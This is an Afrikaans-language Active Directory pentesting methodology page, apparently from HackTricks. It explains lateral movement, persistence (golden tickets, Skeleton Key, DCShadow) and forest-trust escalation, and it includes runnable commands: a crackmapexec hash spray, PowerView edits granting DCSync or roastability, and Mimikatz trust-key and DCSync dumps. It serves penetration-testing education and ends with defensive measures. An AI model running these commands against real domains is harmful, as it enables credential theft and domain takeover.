Hopelik het jy daarin geslaag om 'n **local admin**-account te **kompromitteer** deur [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), insluitend relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) te gebruik.\
Dan is dit tyd om al die hashes in memory en plaaslik te dump.\
[**Lees hierdie bladsy oor verskillende maniere om die hashes te verkry.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sodra jy die hash van 'n gebruiker het**, kan jy dit gebruik om die gebruiker te **impersonate**.\
Jy moet 'n **tool** gebruik wat die **NTLM-authentication met** daardie **hash uitvoer**, **of** jy kan 'n nuwe **sessionlogon** skep en daardie **hash** binne **LSASS inject**, sodat, wanneer enige **NTLM-authentication uitgevoer word**, daardie **hash gebruik sal word.** Die laaste opsie is wat mimikatz doen.\
[**Lees hierdie bladsy vir meer inligting.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Hierdie attack poog om **die gebruiker se NTLM-hash te gebruik om Kerberos-tickets aan te vra**, as 'n alternatief vir die algemene Pass The Hash oor die NTLM-protokol. Daarom kan dit besonder **nuttig wees in netwerke waar die NTLM-protokol gedeaktiveer is** en slegs **Kerberos as authentication-protokol toegelaat word**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In die **Pass The Ticket (PTT)**-attackmetode **steel aanvallers 'n gebruiker se authentication-ticket** in plaas van sy wagwoord- of hash-waardes. Hierdie gesteelde ticket word dan gebruik om die gebruiker te **impersonate**, wat ongemagtigde toegang tot hulpbronne en dienste binne 'n netwerk verkry.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

As jy die **hash** of **wagwoord** van 'n **local administrato**r het, moet jy probeer om **plaaslik** met dit by ander **rekenaars** aan te meld.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Let daarop dat dit redelik **noisy** is en dat **LAPS** dit sou **mitigate**.

### MSSQL Abuse & Trusted Links

As 'n gebruiker voorregte het om toegang tot **MSSQL instances** te verkry, kan hy dit moontlik gebruik om **commands** op die MSSQL-host uit te voer (indien dit as SA loop), die NetNTLM-**hash** te **steal** of selfs 'n **relay**-**attack** uit te voer.\
Indien 'n MSSQL-instance deur middel van 'n databasis-skakel deur 'n ander instance vertrou word, kan 'n gebruiker met voorregte oor die gekoppelde databasis moontlik die **trust relationship gebruik om queries op die ander instance uit te voer**. Hierdie trusts kan geketting word en kan uiteindelik 'n verkeerd gekonfigureerde databasis bereik waar die gebruiker commands kan uitvoer.\
**Die skakels tussen databasisse werk selfs oor forest trusts heen.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Derdeparty-inventory- en deployment-suites stel dikwels kragtige paaie na credentials en code execution bloot. Sien:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

As jy enige Computer-object vind met die [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)-attribute en jy domain privileges op die rekenaar het, sal jy TGTs uit die memory van elke gebruiker wat by die rekenaar aanmeld, kan dump.\
Dus, as 'n **Domain Admin by die rekenaar aanmeld**, sal jy sy TGT kan dump en hom kan impersonateer deur [Pass the Ticket](pass-the-ticket.md) te gebruik.\
Danksy constrained delegation kan jy selfs 'n **Print Server outomaties compromise** (hopelik sal dit 'n DC wees).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

As 'n gebruiker of rekenaar vir "Constrained Delegation" toegelaat word, sal dit **enige gebruiker kan impersonateer om toegang tot sekere services op 'n rekenaar te verkry**.\
Dus, as jy die **hash van hierdie gebruiker/rekenaar compromise**, sal jy **enige gebruiker** (selfs domain admins) kan **impersonate** om toegang tot sekere services te verkry.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

As jy **WRITE**-voorreg op 'n Active Directory-object van 'n remote rekenaar het, kan jy code execution met **elevated privileges** verkry:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Die compromised gebruiker kan **interessante voorregte oor sekere domain objects** hê wat jou lateraal kan laat **move**/**privileges kan laat escalate**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Die ontdekking van 'n **Spool service wat binne die domain luister**, kan **abused** word om **nuwe credentials te verkry** en **privileges te escalate**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

As **ander gebruikers** toegang tot die **compromised** masjien verkry, is dit moontlik om **credentials uit memory te gather** en selfs **beacons in hul processes te inject** om hulle te impersonateer.\
Gebruikers sal gewoonlik via RDP toegang tot die system verkry; daarom is hier hoe om 'n paar attacks op derdeparty-RDP-sessies uit te voer:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** verskaf 'n system om die **local Administrator password** op domain-joined computers te bestuur, en verseker dat dit **randomized**, uniek en gereeld **changed** word. Hierdie passwords word in Active Directory gestoor en toegang word deur ACLs tot slegs gemagtigde users beheer. Met voldoende permissions om toegang tot hierdie passwords te verkry, word pivoting na ander computers moontlik.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Die gathering van certificates** vanaf die compromised masjien kan 'n manier wees om privileges binne die environment te escalate:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

As **vulnerable templates** gekonfigureer is, is dit moontlik om hulle te abuse om privileges te escalate:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sodra jy **Domain Admin**- of, nog beter, **Enterprise Admin**-privileges verkry, kan jy die **domain database**: _ntds.dit_ dump.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Sommige van die tegnieke wat vroeër bespreek is, kan vir persistence gebruik word.\
Byvoorbeeld, jy kan:

- Users vulnerable to [**Kerberoast**](kerberoast.md) maak

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Users vulnerable to [**ASREPRoast**](asreproast.md) maak

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- [**DCSync**](#dcsync)-privileges aan 'n user toeken

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Die **Silver Ticket attack** skep 'n **legitimate Ticket Granting Service (TGS) ticket** vir 'n spesifieke service deur die **NTLM hash** (byvoorbeeld die **hash van die PC account**) te gebruik. Hierdie metode word gebruik om **toegang tot die service privileges te verkry**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

'n **Golden Ticket attack** behels dat 'n aanvaller toegang tot die **NTLM hash van die krbtgt account** in 'n Active Directory (AD)-environment verkry. Hierdie account is spesiaal omdat dit gebruik word om alle **Ticket Granting Tickets (TGTs)** te sign, wat noodsaaklik is vir authentication binne die AD-network.

Sodra die aanvaller hierdie hash verkry, kan hy **TGTs** vir enige account van sy keuse skep (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Dit is soos golden tickets wat op 'n manier forged is wat **algemene golden tickets-detection mechanisms omseil.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Om certificates van 'n account te hê of dit te kan request**, is 'n baie goeie manier om persistence in die user se account te behou (selfs al verander hy die password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Dit is ook moontlik om certificates te gebruik om met hoë privileges binne die domain persistence te behou:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Die **AdminSDHolder**-object in Active Directory verseker die security van **privileged groups** (soos Domain Admins en Enterprise Admins) deur 'n standaard **Access Control List (ACL)** oor hierdie groups toe te pas om unauthorized changes te voorkom. Hierdie feature kan egter exploited word; indien 'n aanvaller die AdminSDHolder se ACL verander om 'n gewone user volledige access te gee, verkry daardie user uitgebreide beheer oor alle privileged groups. Hierdie security measure, wat bedoel is om te protect, kan dus backfire en ongeoorloofde access toelaat indien dit nie noukeurig gemonitor word nie.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Binne elke **Domain Controller (DC)** bestaan daar 'n **local administrator**-account. Deur admin rights op so 'n masjien te verkry, kan die local Administrator-hash met **mimikatz** extracted word. Daarna is 'n registry modification nodig om die **gebruik van hierdie password te enable**, wat remote access tot die local Administrator-account moontlik maak.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Jy kan sekere **special permissions** aan 'n **user** oor spesifieke domain objects **gee**, wat die user in staat sal stel om **in die toekoms privileges te escalate**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** word gebruik om die **permissions** wat 'n **object** **oor** 'n **object** het, **te store**. As jy net 'n **klein verandering** aan die **security descriptor** van 'n object kan **maak**, kan jy baie interessante privileges oor daardie object verkry sonder dat jy 'n member van 'n privileged group hoef te wees.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse die `dynamicObject` auxiliary class om kortstondige principals/GPOs/DNS records met `entryTTL`/`msDS-Entry-Time-To-Die` te skep; hulle delete hulself sonder tombstones, vee LDAP evidence uit terwyl orphan SIDs, broken `gPLink` references of cached DNS responses agterbly (byvoorbeeld AdminSDHolder ACE pollution of malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alter **LSASS** in memory om 'n **universal password** te establish, wat access tot alle domain accounts verleen.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Jy kan jou **own SSP** create om die **credentials** wat gebruik word om toegang tot die masjien te verkry, in **clear text** te **capture**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dit registreer 'n **new Domain Controller** in die AD en gebruik dit om **attributes** (SIDHistory, SPNs...) op gespesifiseerde objects te **push** sonder om enige **logs** oor die **modifications** agter te laat. Jy **need DA**-privileges en moet binne die **root domain** wees.\
Let daarop dat baie lelike logs sal verskyn indien jy verkeerde data gebruik.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Ons het vroeër bespreek hoe om privileges te escalate as jy **genoeg permission het om LAPS passwords te lees**. Hierdie passwords kan egter ook gebruik word om **persistence te maintain**.\
Sien:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft beskou die **Forest** as die security boundary. Dit impliseer dat die **compromise van 'n enkele domain moontlik tot die compromise van die hele Forest kan lei**.<sup>[[1]](#references)</sup>

### Basic Information

'n [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is 'n security mechanism wat 'n user van een **domain** in staat stel om toegang tot resources in 'n ander **domain** te verkry. Dit skep basies 'n linkage tussen die authentication systems van die twee domains, sodat authentication verifications seamless kan vloei. Wanneer domains 'n trust opstel, exchange en behou hulle spesifieke **keys** binne hul **Domain Controllers (DCs)**, wat noodsaaklik is vir die integriteit van die trust.

In 'n tipiese scenario, as 'n user toegang tot 'n service in 'n **trusted domain** wil verkry, moet hy eers 'n spesiale ticket, bekend as 'n **inter-realm TGT**, vanaf sy eie domain se DC request. Hierdie TGT word encrypted met 'n gedeelde **key** waaroor beide domains ooreengekom het. Die user bied dan hierdie TGT aan die **DC van die trusted domain** om 'n service ticket (**TGS**) te kry. Nadat die trusted domain se DC die inter-realm TGT suksesvol gevalideer het, issue dit 'n TGS wat die user toegang tot die service verleen.

**Steps**:

1. 'n **client computer** in **Domain 1** begin die proses deur sy **NTLM hash** te gebruik om 'n **Ticket Granting Ticket (TGT)** vanaf sy **Domain Controller (DC1)** te request.
2. DC1 issue 'n nuwe TGT indien die client suksesvol authenticated is.
3. Die client request dan 'n **inter-realm TGT** vanaf DC1, wat nodig is om toegang tot resources in **Domain 2** te verkry.
4. Die inter-realm TGT word encrypted met 'n **trust key** wat tussen DC1 en DC2 gedeel word as deel van die two-way domain trust.
5. Die client neem die inter-realm TGT na **Domain 2 se Domain Controller (DC2)**.
6. DC2 verifieer die inter-realm TGT met sy gedeelde trust key en, indien dit geldig is, issue 'n **Ticket Granting Service (TGS)** vir die server in Domain 2 waartoe die client toegang wil hê.
7. Laastens bied die client hierdie TGS aan die server, wat encrypted is met die server se account hash, om toegang tot die service in Domain 2 te verkry.

### Different trusts

Dit is belangrik om daarop te let dat **'n trust eenrigting of tweerigting kan wees**. In die tweerigting-opsie sal beide domains mekaar trust, maar in die **eenrigting**-trust relationship sal een van die domains die **trusted** en die ander die **trusting** domain wees. In laasgenoemde geval sal **jy slegs vanaf die trusted domain toegang tot resources binne die trusting domain kan verkry**.

As Domain A Domain B trust, is A die trusting domain en B die trusted one. Verder sal dit in **Domain A** 'n **Outbound trust** wees; en in **Domain B** 'n **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Dit is 'n algemene opstelling binne dieselfde forest, waar 'n child domain outomaties 'n two-way transitive trust met sy parent domain het. Dit beteken basies dat authentication requests seamless tussen die parent en child kan vloei.
- **Cross-link Trusts**: Ook bekend as "shortcut trusts", word hierdie tussen child domains opgestel om referral processes te versnel. In komplekse forests moet authentication referrals tipies opgaan na die forest root en dan afgaan na die target domain. Deur cross-links te skep, word die journey verkort, wat veral voordelig is in geografies verspreide environments.
- **External Trusts**: Dit word tussen verskillende, onverwante domains opgestel en is van nature non-transitive. Volgens [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) is external trusts nuttig vir toegang tot resources in 'n domain buite die huidige forest wat nie deur 'n forest trust verbind is nie. Security word deur SID filtering met external trusts versterk.
- **Tree-root Trusts**: Hierdie trusts word outomaties tussen die forest root domain en 'n nuut bygevoegde tree root gevestig. Hoewel dit nie algemeen voorkom nie, is tree-root trusts belangrik vir die byvoeging van nuwe domain trees tot 'n forest, sodat hulle 'n unieke domain name kan behou en two-way transitivity kan verseker. Meer information kan in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) gevind word.
- **Forest Trusts**: Hierdie tipe trust is 'n two-way transitive trust tussen twee forest root domains, en dwing ook SID filtering af om security measures te verbeter.
- **MIT Trusts**: Hierdie trusts word gevestig met non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts is ietwat meer specialized en is gerig op environments wat integration met Kerberos-gebaseerde systems buite die Windows-ecosystem vereis.

#### Other differences in **trusting relationships**

- 'n Trust relationship kan ook **transitive** (A trust B, B trust C, dan trust A vir C) of **non-transitive** wees.
- 'n Trust relationship kan as 'n **bidirectional trust** (beide trust mekaar) of as 'n **one-way trust** (slegs een van hulle trust die ander) opgestel word.

### Attack Path

1. **Enumerate** die trusting relationships
2. Check of enige **security principal** (user/group/computer) **access** tot resources van die **ander domain** het, moontlik deur ACE entries of deurdat dit in groups van die ander domain is. Soek na **relationships across domains** (die trust is waarskynlik hiervoor geskep).
1. Kerberoast kan in hierdie geval 'n ander opsie wees.
3. **Compromise** die **accounts** wat deur domains kan **pivot**.

Aanvallers met toegang tot resources in 'n ander domain kan dit deur drie primêre meganismes verkry:

- **Local Group Membership**: Principals kan by local groups op masjiene gevoeg word, soos die “Administrators”-group op 'n server, wat hulle beduidende beheer oor daardie masjien gee.
- **Foreign Domain Group Membership**: Principals kan ook members van groups binne die foreign domain wees. Die doeltreffendheid van hierdie metode hang egter van die aard van die trust en die scope van die group af.
- **Access Control Lists (ACLs)**: Principals kan in 'n **ACL** gespesifiseer word, veral as entities in **ACEs** binne 'n **DACL**, wat hulle toegang tot spesifieke resources gee. Vir diegene wat dieper in die meganika van ACLs, DACLs en ACEs wil delf, is die whitepaper getiteld “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 'n waardevolle resource.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Jy kan **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** check om foreign security principals in die domain te vind. Dit sal user/group van **'n external domain/forest** wees.

Jy kan dit in **Bloodhound** check of powerview gebruik:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Privilege-escalasie van kind- na ouerforest
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Ander maniere om domain trusts te enumerate:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Daar is **2 trusted keys**, een vir _Child --> Parent_ en nog een vir _Parent_ --> _Child_.\
> Jy kan die een wat deur die huidige domein gebruik word, hiermee kry:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskaleer as Enterprise admin na die child/parent-domein deur die trust met SID-History injection te misbruik:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Dit is noodsaaklik om te verstaan hoe die Configuration Naming Context (NC) uitgebuit kan word. Die Configuration NC dien as ’n sentrale bewaarplek vir konfigurasiedata oor ’n forest in Active Directory (AD)-omgewings. Hierdie data word na elke Domain Controller (DC) binne die forest gerepliseer, terwyl writable DCs ’n writable kopie van die Configuration NC behou. Om dit uit te buit, moet ’n mens **SYSTEM privileges op ’n DC** hê, verkieslik ’n child DC.

**Koppel GPO aan root DC site**

Die Sites-container van die Configuration NC bevat inligting oor al die domain-joined rekenaars se sites binne die AD-forest. Deur met SYSTEM privileges op enige DC te werk, kan attackers GPOs aan die root DC sites koppel. Hierdie aksie kan die root-domein kompromitteer deur policies te manipuleer wat op hierdie sites toegepas word.

Vir in-diepte inligting kan ’n mens navorsing oor [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) bestudeer.<sup>[[12]](#references)</sup>

**Kompromitteer enige gMSA in die forest**

Een attack vector behels die teiken van privileged gMSAs binne die domein. Die KDS Root key, wat noodsaaklik is vir die berekening van gMSA se passwords, word binne die Configuration NC gestoor. Met SYSTEM privileges op enige DC is dit moontlik om toegang tot die KDS Root key te verkry en die passwords vir enige gMSA oor die hele forest te bereken.

Gedetailleerde ontleding en stap-vir-stap leiding kan gevind word in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Aanvullende delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Bykomende external research: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Hierdie metode vereis geduld, terwyl daar gewag word vir die skepping van nuwe privileged AD objects. Met SYSTEM privileges kan ’n attacker die AD Schema wysig om enige user volledige beheer oor alle classes te gee. Dit kan lei tot unauthorized access en beheer oor nuutgeskepte AD objects.

Verdere leeswerk is beskikbaar oor [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

Die ADCS ESC5 vulnerability teiken beheer oor Public Key Infrastructure (PKI)-objects om ’n certificate template te skep wat authentication as enige user binne die forest moontlik maak. Omdat PKI-objects in die Configuration NC voorkom, maak die kompromittering van ’n writable child DC die uitvoering van ESC5 attacks moontlik.

Meer besonderhede kan gelees word in [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> In scenario’s sonder ADCS het die attacker die vermoë om die nodige komponente op te stel, soos bespreek in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In hierdie scenario **word jou domein deur ’n eksterne een vertrou**, wat jou **onbepaalde toestemmings** daaroor gee. Jy sal moet vasstel **watter principals van jou domein watter toegang tot die eksterne domein het** en dit dan probeer uitbuit:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterne Forest-domein - Eenrigting (Uitgaande)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In hierdie scenario vertrou **jou domein** sommige **voorregte** aan 'n principal uit **verskillende domeine** toe.

Wanneer 'n **domein egter deur die vertrouende domein vertrou word**, **skep die vertroude domein 'n gebruiker** met 'n **voorspelbare naam** wat die **vertroude wagwoord** as **wagwoord** gebruik. Dit beteken dat dit moontlik is om **toegang tot 'n gebruiker uit die vertrouende domein te verkry om by die vertroude een in te kom**, dit te enumerate en verdere voorregte te probeer eskaleer:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Nog 'n manier om die vertroude domein te kompromitteer, is om 'n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **teenoorgestelde rigting** van die domeintrust geskep is (wat nie baie algemeen is nie).

Nog 'n manier om die vertroude domein te kompromitteer, is om te wag op 'n masjien waar 'n **gebruiker uit die vertroude domein toegang kan verkry** om via **RDP** aan te meld. Die aanvaller kan dan code in die RDP-sessieproses injecteer en van daar af **toegang tot die oorspronklike domein van die slagoffer verkry**.\
Verder, as die **slagoffer sy hardeskyf gemount het**, kan die aanvaller vanuit die **RDP-sessieproses** **backdoors** in die **startup folder van die hardeskyf** stoor. Hierdie tegniek word **RDPInception** genoem.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Versagting van misbruik van domeintrust

### **SID Filtering:**

- Die risiko van attacks wat die SID history-attribuut oor forest trusts heen misbruik, word deur SID Filtering versag, wat by verstek op alle inter-forest trusts geaktiveer is. Dit berus op die aanname dat intra-forest trusts veilig is, aangesien die forest, eerder as die domein, volgens Microsoft se standpunt die security boundary is.
- Daar is egter 'n probleem: SID filtering kan toepassings en gebruikertoegang ontwrig, wat tot die soms deaktivering daarvan lei.

### **Selective Authentication:**

- Vir inter-forest trusts verseker die gebruik van Selective Authentication dat gebruikers uit die twee forests nie outomaties geauthentiseer word nie. In plaas daarvan word eksplisiete permissions vereis vir gebruikers om toegang tot domeine en servers binne die trusting domain of forest te verkry.
- Dit is belangrik om daarop te let dat hierdie maatreëls nie beskerm teen die exploitation van die writable Configuration Naming Context (NC) of attacks op die trust account nie.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-gebaseerde AD Abuse vanaf On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) herimplementeer bloodyAD-styl LDAP-primitives as x64 Beacon Object Files wat volledig binne 'n on-host implant (byvoorbeeld Adaptix C2) loop. Operators compileer die pack met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs`, en roep dan `ldap <subcommand>` vanaf die beacon aan. Alle verkeer gebruik die huidige logon security context oor LDAP (389) met signing/sealing of LDAPS (636) met outomatiese certificate trust, dus is geen socks proxies of disk artifacts nodig nie.<sup>[[4]](#references)</sup>

### LDAP-enumeration aan die implant-kant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` en `get-groupmembers` resolve short names/OU paths na volledige DNs en dump die ooreenstemmende objects.
- `get-object`, `get-attribute` en `get-domaininfo` haal arbitrêre attributes (insluitend security descriptors) plus die forest/domain-metadata uit `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` en `get-rbcd` stel roasting candidates, delegation settings en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)-descriptors direk vanaf LDAP bloot.
- `get-acl` en `get-writable --detailed` parse die DACL om trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) en inheritance te lys, wat onmiddellike targets vir ACL privilege escalation bied.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operator nuwe principals of machine accounts voorberei waar OU-regte bestaan. `add-groupmember`, `set-password`, `add-attribute` en `set-attribute` kaap teikens direk sodra Write-property-regte gevind word.
- ACL-gefokusde commands soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` en `add-dcsync` skakel WriteDACL/WriteOwner op enige AD-object om in password resets, beheer oor group membership of DCSync-replikasievoorregte sonder om PowerShell/ADSI-artefakte agter te laat. `remove-*`-teenhangers verwyder geïnjekteerde ACEs.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` maak ’n gekompromitteerde gebruiker onmiddellik Kerberoastable; `add-asreproastable` (UAC-toggle) merk dit vir AS-REP roasting sonder om aan die password te raak.
- Delegation-makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC-flags of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf die beacon, wat constrained/unconstrained/RBCD-aanvalspaaie moontlik maak en die behoefte aan remote PowerShell of RSAT uitskakel.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` inject bevoorregte SIDs in ’n beheerde principal se SID history (sien [SID-History Injection](sid-history-injection.md)), wat stealthy toegangserfenis volledig oor LDAP/LDAPS verskaf.
- `move-object` verander die DN/OU van computers of users, sodat ’n aanvaller bates na OUs kan verskuif waar delegated rights reeds bestaan voordat `set-password`, `add-groupmember` of `add-spn` misbruik word.
- Commands vir streng begrensde verwydering (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ens.) maak vinnige rollback moontlik nadat die operator credentials of persistence versamel het, wat telemetry minimaliseer.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Leer hier meer oor hoe om credentials te beskerm.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins-beperkings**: Dit word aanbeveel dat Domain Admins slegs by Domain Controllers mag aanmeld, en dat die gebruik daarvan op ander hosts vermy word.
- **Service Account-voorregte**: Services moet nie met Domain Admin (DA)-voorregte uitgevoer word nie, om sekuriteit te handhaaf.
- **Temporale voorregbeperking**: Vir take wat DA-voorregte vereis, moet die duur daarvan beperk word. Dit kan bereik word met: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay-versagting**: Oudit Event IDs 2889/3074/3075 en dwing dan LDAP signing plus LDAPS channel binding op DCs/clients af om LDAP MITM/relay-pogings te blokkeer.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

As jy algemene AD tradecraft wil opspoor, **moenie slegs op operator-beheerde artefakte staatmaak nie**, soos hernoemde binaries, service names, temp batch files of output paths. Stel ’n baseline op van hoe legitieme Windows clients [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC en WMI-verkeer opbou, en soek dan na **implementeringseienaardighede** wat voortbestaan selfs nadat die operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` of `ntlmrelayx.py` gewysig het.<sup>[[8]](#references)</sup>

